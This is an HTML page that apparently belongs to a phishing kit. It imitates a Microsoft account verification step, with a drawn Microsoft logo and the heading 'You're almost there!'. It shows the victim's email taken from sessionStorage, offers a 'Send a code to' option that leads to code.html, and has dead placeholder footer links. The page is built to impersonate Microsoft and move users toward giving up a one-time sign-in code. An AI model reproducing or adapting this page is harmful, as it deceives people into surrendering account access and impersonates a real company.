<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
  width: 100%; height: 100%;
  font-family: "Segoe UI", Arial, sans-serif;
  background: linear-gradient(135deg, #eceef5 0%, #e2e6f0 50%, #d8dff0 100%);
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  min-height: 100vh;
}

/* carte blanche */
.card {
  background: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 20px rgba(0,0,0,0.1);
  padding: clamp(24px, 4vw, 44px) clamp(24px, 4vw, 44px);
  width: min(460px, 90%);
  display: flex; flex-direction: column; align-items: center;
  text-align: center;
}

/* logo Microsoft */
.ms-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 5%; }
.ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 20px; height: 20px; }
.ms-grid span { display: block; }
.ms-name { font-size: clamp(14px, 2.5vw, 18px); font-weight: 600; color: #1b1b1b; }

/* pill */
.pill {
  padding: 4px 16px; border-radius: 20px;
  background: #fff; border: 1px solid #d2d0ce;
  font-size: clamp(11px, 2vw, 13px); color: #323130;
  white-space: nowrap; max-width: 90%;
  overflow: hidden; text-overflow: ellipsis;
  margin-bottom: 5%;
}

h1 { font-size: clamp(18px, 3.5vw, 24px); font-weight: 700; color: #1b1b1b; margin-bottom: 3%; }

.subtitle {
  font-size: clamp(12px, 2vw, 14px); color: #605e5c;
  line-height: 1.5; margin-bottom: 6%;
  max-width: 85%;
}

/* option envoi */
.option {
  display: flex; align-items: center; gap: 14px;
  width: 100%; padding: 4% 5%;
  border: 1px solid #d2d0ce; border-radius: 4px;
  cursor: pointer; background: #fff;
  transition: background 0.1s;
  text-align: left; margin-bottom: 4%;
}
.option:hover { background: #f3f2f1; }
.option svg { flex-shrink: 0; }
.option-text { font-size: clamp(12px, 2vw, 14px); font-weight: 600; color: #1b1b1b; }
.option-sub  { font-size: clamp(11px, 1.8vw, 13px); color: #1b1b1b; }

/* liens bleus */
.blue-link {
  font-size: clamp(12px, 2vw, 14px); color: #0078d4;
  text-decoration: none; cursor: pointer;
  margin-bottom: 3%; display: block;
  background: none; border: none; font-family: inherit;
}
.blue-link:hover { text-decoration: underline; }

/* footer */
.footer {
  margin-top: 6%;
  font-size: clamp(10px, 1.5vw, 12px); color: #605e5c;
  text-align: center;
}
.footer a { color: #0078d4; text-decoration: none; margin: 0 6px; }
.footer a:hover { text-decoration: underline; }
.footer-bottom { margin-top: 4px; }
.footer-bottom a { color: #0078d4; }
</style>
</head>
<body>

<div class="card">
  <div class="ms-logo">
    <div class="ms-grid">
      <span style="background:#f25022"></span>
      <span style="background:#7fba00"></span>
      <span style="background:#00a4ef"></span>
      <span style="background:#ffb900"></span>
    </div>
    <span class="ms-name">Microsoft</span>
  </div>

  <div class="pill" id="pill"></div>

  <h1>You're almost there!</h1>
  <p class="subtitle">There is one more step for you to verify that it is indeed you.</p>

  <div class="option" onclick="window.location.href='code.html'">
    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
      <rect x="1" y="4" width="18" height="13" rx="2" stroke="#605e5c" stroke-width="1.5" fill="none"/>
      <path d="M1 7l9 5 9-5" stroke="#605e5c" stroke-width="1.5"/>
    </svg>
    <div>
      <div class="option-text">Send a code to</div>
      <div class="option-sub" id="sendLabel"></div>
    </div>
  </div>

  <button class="blue-link">Do you already have a code?</button>
  <button class="blue-link">Do you not recognize or do not have any of these items?</button>
</div>

<div class="footer">
  <div>
    <a href="#">Help</a>
    <a href="#">Terms of Use</a>
    <a href="#">Privacy and cookies</a>
  </div>
  <div class="footer-bottom">
    Use private browsing if this is not your device. <a href="#">Learn more</a>
  </div>
</div>

<script>
const email = sessionStorage.getItem('email') || 'email@exemple.com';
document.getElementById('pill').textContent = email;
document.getElementById('sendLabel').textContent = email;
</script>
</body>
</html>
